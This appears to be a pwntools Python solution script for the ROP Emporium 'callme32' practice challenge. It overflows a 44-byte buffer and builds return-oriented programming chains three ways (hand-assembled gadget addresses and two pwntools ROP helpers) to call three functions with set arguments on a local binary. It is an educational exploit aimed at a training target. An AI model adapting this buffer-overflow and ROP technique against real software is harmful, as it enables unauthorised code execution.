from pwn import *

context.binary = elf = ELF('./callme32')

offset = 44

callme_one   = elf.plt['callme_one']   
callme_two   = elf.plt['callme_two']   
callme_three = elf.plt['callme_three'] 

arg1 = 0xdeadbeef
arg2 = 0xcafebabe
arg3 = 0xd00df00d

pop_esi_edi_ebp = 0x080487f9
pop_ebp = 0x080487fb
pop_edi_ebp = 0x080487fa

# SOLUTION 1
insert_prm = p32(pop_esi_edi_ebp)+p32(arg1)+p32(arg2)+p32(arg3)
payload = b'A'*offset + p32(callme_one) + insert_prm + p32(callme_two) + insert_prm + p32(callme_three) + insert_prm 

# SOLUTION 2
rop = ROP(elf)
param = [0xdeadbeef, 0xcafebabe, 0xd00df00d]

rop.callme_one(*param)
rop.callme_two(*param)
rop.callme_three(*param)
#payload = b'A'*offset + rop.chain()

# SOLUTION 3
rop = ROP(elf)
rop.call('callme_one', [0xdeadbeef, 0xcafebabe, 0xd00df00d])
rop.call('callme_two', [0xdeadbeef, 0xcafebabe, 0xd00df00d])
rop.call('callme_three', [0xdeadbeef, 0xcafebabe, 0xd00df00d])

#payload = b'A'*offset + rop.chain()

p = elf.process()
#gdb.attach(p)

p.recv()
p.sendline(payload)
#p.interactive
log.info(p.recvall())

